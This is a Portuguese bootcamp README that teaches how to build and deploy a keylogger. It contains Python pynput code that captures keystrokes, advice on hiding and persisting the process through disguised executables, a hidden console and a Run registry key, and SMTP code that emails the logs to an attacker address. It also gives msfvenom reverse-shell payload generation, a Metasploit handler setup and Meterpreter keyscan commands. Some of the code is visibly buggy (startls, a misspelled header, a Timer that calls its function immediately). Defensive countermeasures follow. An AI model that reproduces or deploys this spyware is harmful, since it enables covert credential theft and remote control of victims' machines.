# ⌨️ Keylogger 

> ⚠️ **Aviso importante:** Este projeto tem finalidade estritamente educacional, desenvolvido em ambiente isolado e controlado como parte do Santander Bootcamp 2025. O uso de keyloggers contra sistemas ou pessoas sem autorização explícita configura crime no Brasil (Lei nº 12.737/2012 e Lei nº 14.155/2021). Toda prática descrita aqui foi realizada em ambiente virtualizado, sem acesso a dados reais.

---

## 📌 O que é um Keylogger?

Keylogger é um tipo de malware — ou ferramenta de monitoramento — que registra as teclas digitadas pelo usuário sem seu conhecimento ou consentimento. O resultado é um arquivo de log que pode conter senhas, mensagens, dados bancários, conversas privadas e qualquer outra informação inserida via teclado.

Keyloggers são uma das ferramentas mais antigas de espionagem digital, mas permanecem extremamente relevantes. Eles aparecem em campanhas de espionagem corporativa, roubo de credenciais bancárias, e como componente de RATs (*Remote Access Trojans*) mais sofisticados. Ao contrário do ransomware, que se anuncia com uma mensagem de resgate, um keylogger bem feito permanece invisível por semanas ou meses, exfiltrando dados silenciosamente.

Existem duas modalidades principais:

- **Software:** intercepta eventos de teclado via APIs do sistema operacional, hooks de baixo nível ou drivers. É o foco desta simulação.
- **Hardware:** dispositivos físicos inseridos entre o teclado e o computador (ou embutidos no próprio teclado). Não deixam rastros no sistema operacional e são praticamente indetectáveis por software.

---

## ⚙️ Como Funciona na Prática

### Abordagem por Software (Python + pynput)

O funcionamento de um keylogger por software se baseia em interceptar eventos de teclado disponibilizados pelo sistema operacional antes que cheguem à aplicação de destino. No Python, a biblioteca `pynput` oferece essa capacidade de forma multiplataforma.

#### Configuração do Ambiente Virtual

Antes de instalar o `pynput`, é boa prática (e necessária em sistemas mais recentes) usar um ambiente virtual Python:

```bash
# Criar o ambiente virtual
python -m venv venv

# Ativar — Linux/macOS
source venv/bin/activate

# Ativar — Windows
venv\Scripts\activate

# Instalar a dependência
pip install pynput
```

O ambiente virtual isola as dependências do projeto sem afetar o Python global do sistema.

---

### Etapas do Funcionamento

#### 1. Captura de Teclas
Um *listener* global é registrado no sistema operacional. A cada evento de teclado — tecla pressionada ou solta — uma função de *callback* é chamada automaticamente, recebendo o objeto da tecla como parâmetro. A lógica diferencia teclas especiais (Enter, Backspace, Esc) de caracteres alfanuméricos:

```python
from pynput import keyboard
import toEmail

# Mapeamento de teclas especiais para o texto correspondente
TECLAS_ESPECIAIS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
    keyboard.Key.backspace: " [BACKSPACE] ",
    keyboard.Key.esc: " [ESC] ",
}

def on_press(key):
    with open("Keylogger/files/log.txt", "a", encoding="utf-8") as file:
        try:
            # Tenta tecla normal
            file.write(key.char)
        except AttributeError:
            # Se for especial, verifica no dicionário
            if key in TECLAS_ESPECIAIS:
                file.write(TECLAS_ESPECIAIS[key])
            else:
                # Para qualquer outra tecla não mapeada
                file.write(f"[{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
	toEmail.enviar_email()
	listener.join()
```

#### 2. Persistência em Arquivo
As teclas capturadas são concatenadas e escritas em um arquivo `.txt` local. Esse log acumula toda a digitação da sessão. Teclas especiais são registradas entre colchetes para facilitar a leitura posterior (`[ENTER]`, `[BACKSPACE]`, `[SPACE]`):

```python
def on_press(key):
    with open("Keylogger/files/log.txt", "a", encoding="utf-8") as file:
        try:
            # Tenta tecla normal
            file.write(key.char)
        except AttributeError:
            # Se for especial, verifica no dicionário
            if key in TECLAS_ESPECIAIS:
                file.write(TECLAS_ESPECIAIS[key])
            else:
                # Para qualquer outra tecla não mapeada
                file.write(f"[{key}] ")
```

#### 3. Furtividade
Em ataques reais, o processo precisa ser invisível para a vítima. As técnicas variam conforme o sistema operacional:

- **Windows:** o script pode ser compilado com `PyInstaller` em um executável com ícone legítimo (PDF, documento Word), janelas são ocultadas via chamadas à API do Windows (`ShowWindow(GetConsoleWindow(), SW_HIDE)`), e o processo pode ser renomeado para algo inócuo no gerenciador de tarefas.
- **Linux/macOS:** o processo pode ser executado em background via `nohup` ou `daemon`, com redirecionamento de saída para `/dev/null`.
- **Persistência no sistema:** entradas no registro do Windows (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) ou crons no Linux garantem que o keylogger reinicie automaticamente com o sistema:

Para fins do desafio, o arquivo `main.py` será renomeado para a extensão `.pyw`, tornando-o furtivo pelo terminal.

#### 4. Exfiltração por E-mail
O log acumulado é periodicamente enviado ao endereço do atacante via SMTP, usando o módulo `smtplib` nativo do Python. Em contas do Gmail, isso requer o uso de uma *App Password* gerada nas configurações de segurança da conta (a autenticação padrão por senha simples foi descontinuada pelo Google):

```python
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# Configurações do EMAIL
EMAIL_ORIGEM = "daniel.bomfim.assis@gmail.com"
EMAIL_DESTINO = "daniel.bomfim.assis@gmail.com"
SENHA_EMAIL = "" # Senha do email especificado

log = ""

def enviar_email():
	global log
	if log:
		message = MIMEText(log)
		message["SUBEJCT"] = "Dados capturados pelo keylogger"
		message["From"] = EMAIL_ORIGEM
		message["To"] = EMAIL_DESTINO
		try:
			server = smtplib.SMTP("smtp.gmail.com", 587)
			server.startls()
			server.login(EMAIL_ORIGEM, SENHA_EMAIL)
			server.send_message(message)
			server.quit()
		except Exception:
			print("Erro ao enviar", Exception)

	# Agendar o envio
	Timer(60, enviar_email())
```

---

## 🖥️ Abordagem com msfconsole (Metasploit Framework)

O **Metasploit Framework** oferece um módulo de keylogging nativo integrado ao **Meterpreter** — seu payload de pós-exploração mais avançado. Essa abordagem elimina a necessidade de desenvolver código do zero e opera inteiramente na memória da vítima, sem gravar arquivos em disco (*fileless*), o que dificulta significativamente a detecção por antivírus baseados em assinatura.

> 📌 Todo o procedimento abaixo foi realizado em ambiente virtualizado: máquina atacante Kali Linux e máquina vítima Windows em rede NAT interna, sem conexão com a internet.

---

### Etapa 1 — Geração do Payload com msfvenom

O `msfvenom` é a ferramenta do Metasploit para geração de payloads. O comando abaixo cria um executável Windows que, ao ser executado na máquina da vítima, abre uma sessão Meterpreter reversa (a vítima conecta de volta ao atacante, contornando firewalls que bloqueiam conexões de entrada):

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=<IP_DA_MÁQUINA_KALI> \
         LPORT=4444 \
         -f exe \
         -o payload.exe
```

Parâmetros relevantes:
- `-p windows/meterpreter/reverse_tcp` — payload: Meterpreter reverso para Windows 32-bit. Para sistemas 64-bit, usa-se `windows/x64/meterpreter/reverse_tcp`.
- `LHOST` — IP da máquina Kali Linux, para onde a conexão reversa será direcionada.
- `LPORT` — porta que ficará aguardando a conexão (qualquer porta disponível acima de 1024 funciona).
- `-f exe` — formato de saída: executável Windows.
- `-o payload.exe` — nome do arquivo gerado.

---

### Etapa 2 — Configuração do Listener no msfconsole

Na máquina Kali, o `msfconsole` é configurado para aguardar a conexão reversa do payload:

```bash
msfconsole

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP_DA_MÁQUINA_KALI>
set LPORT 4444
run
```

O `multi/handler` é um módulo genérico de escuta compatível com qualquer payload reverso gerado pelo `msfvenom`. Quando a vítima executa o `payload.exe`, a sessão Meterpreter é aberta automaticamente no console do atacante.

---

### Etapa 3 — Keylogging via Meterpreter

Com a sessão Meterpreter ativa, o keylogging é feito com três comandos:

```bash
# Inicia a captura de teclas em segundo plano na máquina da vítima
keyscan_start

# Exibe no console do atacante todas as teclas capturadas até o momento
keyscan_dump

# Encerra a captura
keyscan_stop
```

O Meterpreter injeta o módulo de keylogging diretamente na memória de um processo legítimo do sistema da vítima (migração de processo via `migrate <PID>`). Isso significa que nenhum arquivo é gravado em disco do lado da vítima — o log existe apenas na memória e é transmitido ao atacante quando `keyscan_dump` é executado.

Além do keylogging, o Meterpreter oferece outros módulos de pós-exploração relevantes do ponto de vista defensivo: captura de screenshots, acesso à câmera, dump de hashes de senha (`hashdump`), e movimentação lateral na rede. Conhecer essas capacidades é fundamental para quem atua em resposta a incidentes ou em auditorias de segurança.

---

## 🛡️ Contramedidas e Estratégias de Defesa

### Antivírus e EDR
Soluções modernas de Endpoint Detection and Response detectam tanto assinaturas de payloads conhecidos quanto comportamentos suspeitos: hooking de APIs de teclado, injeção em processos legítimos, e conexões reversas para IPs desconhecidos. A abordagem *fileless* do Meterpreter dificulta a detecção baseada em arquivo, mas não elimina os indicadores comportamentais que um EDR monitora.

### Teclado Virtual para Dados Sensíveis
Para operações críticas — acesso a internet banking, inserção de senhas importantes — o uso de teclado virtual na tela contorna keyloggers de software. A entrada não passa pelo driver de teclado convencional, portanto não gera os eventos que o logger captura. É uma medida paliativa, não preventiva, mas eficaz contra keyloggers que não capturam cliques do mouse.

### Autenticação Multifator (MFA)
Mesmo que credenciais sejam completamente capturadas pelo keylogger, o MFA impede sua utilização sem o segundo fator — um token físico (YubiKey), um código de autenticador (TOTP) ou uma notificação push. É uma das defesas em camadas mais eficazes contra o impacto real de um keylogger.

### Monitoramento de Rede (SIEM / IDS)
A exfiltração por e-mail e a conexão reversa do Meterpreter geram tráfego de rede anômalo: conexões SMTP saindo de uma estação de trabalho, ou uma conexão TCP persistente para um IP externo desconhecido na porta 4444. Ferramentas de monitoramento como Suricata, Zeek ou soluções SIEM podem identificar e alertar sobre esse tráfego.

### Princípio do Menor Privilégio
Um keylogger executando sem privilégios elevados não consegue fazer hook em processos de outros usuários ou do sistema, nem migrar para processos críticos como o Meterpreter faz. Conta de usuário padrão no dia a dia, sem direitos administrativos, limita drasticamente o que qualquer malware pode fazer.

### Atualização de Sistemas e Patch Management
Muitos payloads do Metasploit exploram vulnerabilidades conhecidas para ganho de acesso inicial. Manter sistemas operacionais e aplicativos atualizados fecha os vetores de exploit mais comuns. Vulnerabilidades em software desatualizado são rotineiramente listadas em bancos de dados públicos como o NVD/CVE — e atacantes as monitoram tanto quanto os defensores.

### Conscientização do Usuário
O vetor de entrega de um payload executável quase sempre passa por engenharia social: um e-mail com anexo malicioso disfarçado de nota fiscal, um link para "atualização urgente do software", um USB deixado estrategicamente. Treinamentos regulares e simulações de phishing reduzem significativamente a probabilidade de um usuário executar um arquivo não solicitado.

---

## 🔗 Referências

- MITRE ATT&CK — Técnica T1056.001 (Keylogging): https://attack.mitre.org/techniques/T1056/001/
- Rapid7 Metasploit Documentation — Meterpreter: https://docs.rapid7.com/metasploit/meterpreter/
- NIST SP 800-61 Rev. 2 — Computer Security Incident Handling Guide
- pynput Documentation: https://pynput.readthedocs.io/
- Lei nº 14.155/2021 — Fortalecimento dos crimes cibernéticos no Brasil

---

*Projeto desenvolvido como parte do Santander Bootcamp 2025 — Unidade 5: Segurança Ofensiva e Defensiva.*
